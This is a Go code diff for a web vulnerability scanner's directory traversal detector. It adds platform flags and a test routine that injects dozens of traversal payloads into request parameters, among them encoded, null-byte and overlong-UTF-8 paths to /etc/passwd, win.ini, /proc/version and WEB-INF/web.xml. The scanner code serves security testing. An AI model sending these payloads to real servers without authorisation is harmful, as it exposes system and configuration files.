@@ -38,6 +38,10 @@ type classDirectoryTraversal struct {
 	injectionValidator     TInjectionValidator
 	scanningWAVSEP         bool
 	scanningOwaspBenchmark bool
+	isUnix                 bool
+	isWindows              bool
+	isJava                 bool
+	isUnknown              bool
 }
 
 var plainTexts = []string{
@@ -87,7 +91,7 @@ func (c *classDirectoryTraversal) verifyLinksForTraversal(varIndex int, value st
 //dontEncode 是否编码
 func (c *classDirectoryTraversal) testInjection(varIndex int, value string, dontEncode bool) bool {
 	var job = c.lastJob
-	b, matchedText := c.InjectionPatterns.searchOnText(job.Features.Response.String())
+	b, _ := c.InjectionPatterns.searchOnText(job.Features.Response.String())
 	if b {
 		// here we need to make sure it's not a false positive
 		// mix up the value to cause the injection to fail, the patterns should not be present in response
@@ -195,4 +199,147 @@ func (c *classDirectoryTraversal) shouldRunAllTests(index int, origValue string)
 	}
 
 	return true
+}
+
+func (c *classDirectoryTraversal) startTesting() bool {
+
+	if c.variations != nil {
+		for _, p := range c.variations.Params {
+			if c.foundVulnOnVariation {
+				break
+			}
+			var filePath = strings.ToLower(c.scheme.Path)
+			if strings.HasSuffix(filePath, `.aspx`) || strings.HasSuffix(filePath, `.asp`) {
+				c.isUnix = false
+				c.isWindows = true
+			} else if strings.HasSuffix(filePath, `.jsp`) {
+				c.isJava = true
+			}
+			// for WAVSEP send all payloads
+			if c.scanningWAVSEP || c.scanningOwaspBenchmark {
+				c.isWindows = true
+				c.isUnix = true
+			}
+			var origValue = p.Value
+			var extension = "jpg"
+			if strings.Index(p.Value, ".") != -1 {
+				arraystr := strings.Split(p.Value, ".")
+				extension = arraystr[len(arraystr)-1]
+			}
+			if !c.testInjection(p.Index, "../../../../../../../../../../../../../../etc/passwd", false) {
+				return true
+			}
+			if !c.testInjection(p.Index, "../../../../../../../../../../../../../../windows/win.ini", false) {
+				return true
+			}
+			if c.shouldRunAllTests(p.Index, origValue) {
+				if c.isUnix || c.isUnknown {
+					if !c.testInjection(p.Index, "../../../../../../../../../../../../../../../proc/version", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, `../../../../../../../../../../etc/passwd%00.`+extension, true) {
+						return true
+					}
+					if !c.testInjection(p.Index, "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00."+extension, false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "/../..//../..//../..//../..//../..//etc/passwd%00."+extension, true) {
+						return true
+					}
+					if !c.testInjection(p.Index, ".\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "/etc/passwd", true) {
+						return true
+					}
+					if !c.testInjection(p.Index, "%2fetc%2fpasswd", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "/.././.././.././.././.././.././.././../etc/./passwd%00", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "../././../././../././../././../././../././../././../././../././../././etc/passwd", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd", true) {
+						return true
+					}
+					if !c.testInjection(p.Index, "invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.", true) {
+						return true
+					}
+
+				}
+				if c.isUnix || c.isWindows || c.isUnknown {
+					// web-inf web.xml
+					if !c.testInjection(p.Index, "WEB-INF/web.xml", false) {
+						return true
+					}
+					// web-inf web.xml variant
+					if !c.testInjection(p.Index, "WEB-INF\\web.xml", false) {
+						return true
+					}
+				}
+				if c.isJava {
+					if !c.testInjection(p.Index, "//WEB-INF/web.xml", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "/static/WEB-INF/web.xml", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "/forward:/WEB-INF/web.xml", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "./WEB-INF/web.xml", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "./WEB-INF/web.xml?", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "../../WEB-INF/web.xml", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "../../WEB-INF/web.xml?", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "/..\\..\\WEB-INF\\web.xml", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "../../../WEB-INF/web.xml", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "../../../WEB-INF/web.xml?", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "../../../../WEB-INF/web.xml", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "//../....//....//WEB-INF/web.xml", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "../../../../../WEB-INF/web.xml", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "../../../../../../WEB-INF/web.xml", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "../WEB-INF/web.xml;x=", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "../../WEB-INF/web.xml;x=", false) {
+						return true
+					}
+					if !c.testInjection(p.Index, "../../../WEB-INF/web.xml;x=", false) {
+						return true
+					}
+				}
+			}
+		}
+	}
+	return false
 }
